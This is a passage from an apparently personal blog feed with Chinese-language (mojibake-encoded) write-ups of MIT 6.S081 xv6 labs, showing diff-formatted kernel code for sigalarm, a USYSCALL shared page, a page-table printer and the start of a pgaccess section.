</span><span class="token line">  // give up the CPU if this is a timer interrupt.</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(which_dev == 2)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(which_dev == 2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->ticks > 0 &amp;&amp; p->ticksum >= 0 &amp;&amp; ++(p->ticksum) >= p->ticks) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  // save registers</span><span class="token prefix inserted">+</span><span class="token line">  memmove(&amp;(p->strapframe), p->trapframe, sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = -1; // prevent re-entrant calls to the handler</span><span class="token prefix inserted">+</span><span class="token line">  p->trapframe->epc = (uint64)p->handler;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    yield();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  usertrapret();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/user/user.h b/user/user.hindex b71ecda..422a4c1 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,8 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sigalarm(int ticks, void (*handler)()); // here</span><span class="token prefix inserted">+</span><span class="token line">int sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..84c6784 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("sigalarm"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sigreturn");</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸&quot;&gt;&lt;a href=&quot;#ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸&quot; class=&quot;headerlink&quot; title=&quot;ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸&quot;&gt;&lt;/a&gt;ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸&lt;/h1&gt;&lt;p&gt;ä»æœ€è¿‘ä¸¤ä¸ª Lab å¼€å§‹ï¼Œä»£ç é€»è¾‘çš„å¤æ‚åº¦æ˜æ˜¾ä¸Šå‡ï¼Œå¯¹å†…æ ¸è¿›</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Page tables</title>
    <link href="http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/"/>
    <id>http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/</id>
    <published>2024-07-01T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:58.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¢˜ç›®è¦æ±‚åœ¨æ¯ä¸ªè¿›ç¨‹åˆå§‹åŒ–æ—¶ä¸ºå®ƒçš„é¡µè¡¨æ’å…¥ä¸€ä¸ªé¡µè¡¨é¡¹ï¼Œå†…æ ¸é€šè¿‡è¿™æ ·é¢„å…ˆç¼“å­˜é¡µè¡¨é¡¹çš„æ“ä½œï¼Œæ¥åŠ é€Ÿç‰¹å®šç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œé€Ÿåº¦ã€‚</p><p>ç”±äºå‰ä¸ä¹…åˆšè¿‡å®Œä¸€éã€ŠOSTEPã€‹ï¼Œå› æ­¤æˆ‘è®¤ä¸ºè‡ªå·±å¯¹é¡µè¡¨æœºåˆ¶è¿˜ç®—æ¯”è¾ƒç†Ÿæ‚‰ï¼Œåº”å¯¹æœ¬ Lab ç†åº”æ¯”è¾ƒè½»æ¾ï¼Œä½†åœ¨çœŸæ­£ä¸Šæ‰‹çš„æ—¶å€™ï¼Œè¿˜æ˜¯è§‰å¾—æœ‰äº›æ— æ‰€é€‚ä»ï¼Œæ— å¥ˆè€è€å®å®åœ°æŠŠ xv6 æ‰‹å†Œçš„ç¬¬ 3 ç« å¯¹ç…§ç€ä»£ç ä»”ç»†ç ”è¯»äº†ä¸€ç•ªï¼Œä»ä¸­æç‚¼å‡ºäº†å‡ ä¸ªå…³é”®çš„å‡½æ•°ï¼š</p><ol><li><code>kernel/kalloc.c:kalloc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>éå†ç©ºé—²é“¾è¡¨ï¼Œå¯»æ‰¾ä¸€ä¸ªå¯åˆ†é…çš„ç‰©ç†é¡µé¢ã€‚è‹¥æ‰¾åˆ°ï¼Œè¿”å›è¯¥é¡µé¢çš„é¦–ï¼ˆç‰©ç†ï¼‰åœ°å€ï¼›å¦åˆ™ï¼Œè¿”å› 0 ï¼ˆç©ºæŒ‡é’ˆï¼‰ã€‚</p><ol start="2"><li><code>kernel/kalloc.c:kfree</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é‡Šæ”¾å·²åˆ†é…çš„é¦–åœ°å€ä¸º <code>pa</code> çš„ç‰©ç†é¡µé¢ï¼Œå¹¶æ›´æ–°ç©ºé—²é“¾è¡¨ã€‚</p><ol start="3"><li><code>kernel/proc.c:allocproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span><span class="token function">allocproc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>éå†è¿›ç¨‹æ•°ç»„ <code>proc</code>ï¼Œå¯»æ‰¾æœªè¢«ä½¿ç”¨çš„ <code>struct proc</code>ã€‚è‹¥æ‰¾åˆ°ï¼Œåˆ™åˆå§‹åŒ–å…¶çŠ¶æ€ï¼Œä¸ºåˆ›å»ºä¸€ä¸ªæ–°çš„<strong>é¡µè¡¨</strong>ï¼Œå¹¶è¿”å›æŒ‡å‘å®ƒçš„æŒ‡é’ˆï¼›å¦åˆ™ï¼Œè¿”å› 0ï¼ˆç©ºæŒ‡é’ˆï¼‰ã€‚</p><ol start="4"><li><code>kernel/proc.c:freeproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">freeproc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é‡Šæ”¾ä¸è¿›ç¨‹ <code>p</code> ç›¸å…³çš„æ•°æ®çš„å†…å­˜ç©ºé—´ï¼Œå¹¶æ¸…ç©º <code>p</code> çš„ <code>struct proc</code> çš„æ‰€æœ‰ä¿¡æ¯ã€‚</p><ol start="5"><li><code>kernel/vm.c:mappages</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mappages</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 size<span class="token punctuation">,</span> uint64 pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åœ¨é¡µè¡¨ <code>pagetrable</code> ä¸­åˆ›å»ºä»èµ·å§‹è™šæ‹Ÿåœ°å€ <code>va</code> åˆ°èµ·å§‹ç‰©ç†åœ°å€ <code>pa</code> çš„é¡µè¡¨é¡¹æ˜ å°„ï¼Œé¡µè¡¨é¡¹çš„ <code>flags</code> ä½çš„è®¿é—®æƒé™éƒ¨åˆ†è®¾ç½®ä¸º <code>perm</code>ï¼Œå…¶ä¸­å¤§å°ä¸º <code>size</code>ï¼Œå°† <code>size</code> åˆ†ä¸ºè‹¥å¹²é¡µï¼Œä¸ºè¿™äº›é¡µé¢åˆ›å»º <code>va + i * PGSIZE -&gt; pa + i * PGSIZE</code> ï¼ˆ<code>i</code> ä»£è¡¨é¡µé¢çš„ç¼–å·ï¼‰çš„æ˜ å°„ã€‚</p><ol start="6"><li><code>kernel/vm.c:uvmunmap</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">uvmunmap</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 npages<span class="token punctuation">,</span> <span class="token keyword">int</span> do_free<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä» <code>pagetable</code> ä¸­ç§»é™¤ä»è™šæ‹Ÿåœ°å€ <code>va</code> å¼€å§‹çš„ <code>npages</code> ä¸ªé¡µè¡¨é¡¹ã€‚å¯æŒ‡å®š <code>do_free</code> çš„å€¼ï¼Œè‹¥ä¸ä¸º 0ï¼Œåˆ™åœ¨ç§»é™¤é¡µè¡¨é¡¹çš„åŒæ—¶ï¼Œé‡Šæ”¾é¡µè¡¨é¡¹æ˜ å°„ <code>va -&gt; pa</code> ä¸­ <code>pa</code> æŒ‡å‘çš„å†…å­˜ç©ºé—´ã€‚ </p><p>åˆ†æå®Œå‡ ä¸ªå…³é”®å‡½æ•°ä¹‹åï¼Œæ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼š</p><ol><li>ä¸º <code>struct proc</code> ç»“æ„ä½“æ·»åŠ  <code>struct usyscall *usc</code> æ®µã€‚</li><li>åœ¨ <code>allocproc()</code> ä¸­ä¸º <code>usc</code> åˆ†é…ç‰©ç†å†…å­˜ï¼Œå¹¶å¯¹å…¶èµ‹å€¼ï¼š<code>p-&gt;usc-&gt;pid = p-&gt;pid;</code>ã€‚</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">usyscall</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">freeproc</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p<span class="token operator">-></span>usc<span class="token operator">-></span>pid <span class="token operator">=</span> p<span class="token operator">-></span>pid<span class="token punctuation">;</span></code></pre><ol start="3"><li>åœ¨ <code>freeproc()</code> ä¸­é‡Šæ”¾ <code>usc</code> çš„ç‰©ç†å†…å­˜ã€‚</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><ol start="4"><li>åœ¨ <code>proc_pagetable()</code> ä¸­ä½¿ç”¨ <code>mappages</code> æ’å…¥è™šæ‹Ÿåœ°å€ <code>USYSCALL</code> çš„é¡µè¡¨é¡¹ã€‚</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_R <span class="token operator">|</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAMPOLINE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAPFRAME<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmfree</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol start="5"><li>æœ€åï¼Œéå¸¸å®¹æ˜“å¿½è§†çš„ï¼Œåœ¨ <code>proc_freepagetable()</code> ä¸­åˆ é™¤è™šæ‹Ÿåœ°å€ <code>USYSCALL</code> çš„é¡µè¡¨é¡¹ã€‚</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>æ¥ä¸‹æ¥è®²è®²æˆ‘åœ¨æœ¬é¢˜é‡åˆ°çš„å‡ ä¸ªé—®é¢˜ã€‚</p><p><strong>é—®é¢˜ 1ï¼š</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn1.png"></p><p><strong>åŸå› ï¼š</strong> <code>p-&gt;usc-&gt;pid = p-&gt;pid</code> æ”¾åœ¨åˆ†é…ç‰©ç†å†…å­˜ä¹‹å‰ï¼Œå¯¼è‡´ç©ºæŒ‡é’ˆè§£å¼•ç”¨ã€‚</p><p><strong>é—®é¢˜ 2ï¼š</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn2.png"></p><p><strong>åŸå› ï¼š</strong> æœªåœ¨ <code>proc_freepagetable()</code> ä¸­è§£é™¤ <code>USYSCALL</code> çš„é¡µè¡¨é¡¹æ˜ å°„ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„å®¹æ˜“å¿½è§†çš„ç¬¬ 5 ç‚¹ã€‚</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..5fc573f 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -127,6 +127,14 @@ found:<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if ((p->usc = (struct usyscall *)kalloc()) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">freeproc(p);</span><span class="token prefix inserted">+</span><span class="token line">release(&amp;p->lock);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  p->usc->pid = p->pid;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // An empty user page table.</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = proc_pagetable(p);</span><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable == 0)&#123;</span></span>@@ -153,6 +161,9 @@ freeproc(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->trapframe)</span><span class="token prefix unchanged"> </span><span class="token line">    kfree((void*)p->trapframe);</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe = 0;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (p->usc) // here</span><span class="token prefix inserted">+</span><span class="token line">kfree((void*)p->usc);</span><span class="token prefix inserted">+</span><span class="token line">  p->usc = 0;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable)</span><span class="token prefix unchanged"> </span><span class="token line">    proc_freepagetable(p->pagetable, p->sz);</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = 0;</span></span>@@ -195,6 +206,14 @@ proc_pagetable(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    uvmfree(pagetable, 0);</span><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p->usc), PTE_R | PTE_U) &lt; 0) &#123;  </span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAPFRAME, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmfree(pagetable, 0);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pagetable;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -206,6 +225,7 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAPFRAME, 1, 0);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, USYSCALL, 1, 0); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  uvmfree(pagetable, sz);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..d25a729 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -82,6 +82,8 @@ struct trapframe &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">enum procstate &#123; UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE &#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct usyscall;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">// Per-process state</span><span class="token prefix unchanged"> </span><span class="token line">struct proc &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct spinlock lock;</span></span>@@ -105,4 +107,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  struct usyscall *usc;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span></code></pre><h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä»¿ç…§ <code>freewalk</code> å‡½æ•°çš„å†™æ³•ï¼Œé€’å½’æŸ¥æ‰¾æ‰€æœ‰æœ‰æ•ˆçš„é¡µè¡¨é¡¹ï¼Œå¹¶æ ¹æ®é¢˜å¹²è¦æ±‚æ‰“å°ç›¸å…³ä¿¡æ¯ã€‚æ¶‰åŠçš„å†…å®¹è¾ƒå°‘ï¼Œå¦‚æœè®¤çœŸæŠŠä¸Šé¢æåˆ°çš„å‡ ä¸ªå…³é”®å‡½æ•°ç†æ¸…æ¥šï¼Œå¹¶ä¸”ç†è§£äº†å¤šçº§é¡µè¡¨çš„æœºåˆ¶ï¼Œå†™èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒè½»æ¾çš„ï¼Œæµç¨‹å¦‚ä¸‹ï¼š</p><p>éå†å½“å‰é¡µè¡¨ä¸­çš„æ‰€æœ‰é¡µè¡¨é¡¹ï¼Œå¦‚æœé¡µè¡¨é¡¹æœ‰æ•ˆï¼ˆflags çš„æœ‰æ•ˆä½ä¸º 1ï¼‰ï¼Œåˆ™å°†è¯¥é¡µè¡¨é¡¹è½¬æ¢ä¸ºç‰©ç†åœ°å€å‘ä¸‹é€’å½’æœç´¢ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åœ¨é€’å½’æŸ¥æ‰¾åˆ°ç¬¬ 3 çº§é¡µè¡¨æ—¶ï¼Œå°±ä¸èƒ½ç»§ç»­å‘ä¸‹é€’å½’äº†ï¼Œæ­¤æ—¶å¾—åˆ°çš„ <code>pa</code> å°±æ˜¯è¿›è¡Œè™šå®åœ°å€è½¬æ¢åçš„ç‰©ç†åœ°å€ã€‚</p><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..d169300 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -170,6 +170,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/exec.c b/kernel/exec.cindex d62d29d..89f3d74 100644<span class="token coord">--- a/kernel/exec.c</span><span class="token coord">+++ b/kernel/exec.c</span>@@ -115,6 +115,11 @@ exec(char *path, char **argv)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->epc = elf.entry;  // initial program counter = main</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->sp = sp; // initial stack pointer</span><span class="token prefix unchanged"> </span><span class="token line">  proc_freepagetable(oldpagetable, oldsz);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if(p->pid == 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint(p->pagetable);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return argc; // this ends up in a0, the first argument to main(argc, argv)</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..23eeec9 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -432,3 +432,25 @@ copyinstr(pagetable_t pagetable, char *dst, uint64 srcva, uint64 max)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return -1;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void vmprint_recur(pagetable_t pagetable, int depth) &#123;</span><span class="token prefix inserted">+</span><span class="token line">for (int i = 0; i &lt; 512; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">pte_t pte = pagetable[i];</span><span class="token prefix inserted">+</span><span class="token line">if (pte &amp; PTE_V) &#123; // pte is valid</span><span class="token prefix inserted">+</span><span class="token line">for (int j = 0; j &lt; depth; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf(" ..");</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">uint64 child = PTE2PA(pte);</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: pte %p pa %p\n", i, pte, child);</span><span class="token prefix inserted">+</span><span class="token line">if (depth &lt; 3) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur((pagetable_t)child, depth + 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void vmprint(pagetable_t pagetable) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("page table %p\n", pagetable);</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur(pagetable, 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span></code></pre><h1 id="Detecting-which-pages-have-been-accessed"><a href="#Detecting-which-pages-have-been-accessed" class="headerlink" title="Detecting which pages have been accessed"></a>Detecting which pages have been accessed</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¢˜ç›®è¦æ±‚å®ç°ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ <code>sys_pgaccess()</code>ï¼Œè·å–æŒ‡å®šè™šæ‹Ÿé¡µé¢çš„<strong>æœ€è¿‘è¢«è®¿é—®ä¿¡æ¯</strong>ã€‚</p><p>ç®—æ˜¯ä¸€ä¸ªå¤§æ‚çƒ©çš„é¢˜ï¼ŒæŠŠ Lab System calls çš„å†…å®¹å’Œ pagetable ç»“åˆèµ·æ¥ï¼Œä¸è¦è¢« hard éš¾åº¦æ ‡ç­¾å“åˆ°äº†ï¼Œåªè¦å‰é¢çš„ Lab 